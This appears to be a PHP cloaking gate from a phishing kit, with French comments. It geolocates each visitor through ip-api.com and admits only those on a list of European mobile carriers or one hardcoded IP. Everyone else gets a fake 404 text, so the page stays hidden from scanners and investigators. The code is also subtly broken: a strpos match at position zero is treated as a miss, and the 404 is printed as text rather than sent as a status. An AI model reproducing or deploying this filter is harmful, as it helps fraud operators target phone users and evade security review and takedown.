<?php
include('settings.php');

if(!isset($_SESSION)){
  session_start();  // Et on ouvre la session
} 

$ip = $_SERVER['REMOTE_ADDR'];

function getIpInfo($ip = '') {
    $ipinfo = file_get_contents("http://ip-api.com/json/".$ip);
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}

    $visitor_ip = $_SERVER['REMOTE_ADDR'];
    $ipinfo_json = getIpInfo($visitor_ip);
	
    if($ipinfo_json['status'] != 'fail'){

      $org = "{$ipinfo_json['as']}"; // On récupère l'oprateur
      $isps = "{$ipinfo_json['isp']}"; // La mem   
  
    }
    else{
  
      $org = "Introuvable";
      $isps = "Introuvable";
  
    }
    
if ($filterDisable || strpos($org, "A1 Austria") || strpos($org, "T-Mobile") || strpos($org, "3") || strpos($org, "T Mobile") || strpos($org, "Yesss!") || strpos($org, "Hofer telecom") || strpos($org, "TeleRing") || strpos($org, "TDC") || strpos($org, "Telenor") || strpos($org, "Telia") || strpos($org, "Elisa") || strpos($org, "DNA Finland") || strpos($org, "Vodafone") || strpos($org, "Edzcom") || strpos($org, "Eir") || strpos($org, "Orange Slovensko") || strpos($org, "Slovak Telekom") || strpos($org, "O2 Slovakia") || strpos($org, "4ka Swan Telekom") || strpos($org, "Tele2") || strpos($org, "Swisscom") || strpos($org, "Sunrise") || strpos($org, "Salt Mobile") || strpos($org, "Vodafone ziggo")|| strpos($org, "KPN") || strpos($org, "Meo") || strpos($org, "NOS") || strpos($org, "Vodafone") || strpos($org, "EE") || strpos($org, "O2") || strpos($org, "Vodafone UK") || strpos($org, "Movistar") || strpos($org, "Orange")|| strpos($org, "Yoigo") || strpos($org, "Deutsche Telekom") || strpos($org, "CM") ||  $visitor_ip == "102.78.186.110" ) {
	
}
else{
		die('HTTP/1.0 404 Not Found');
}


?>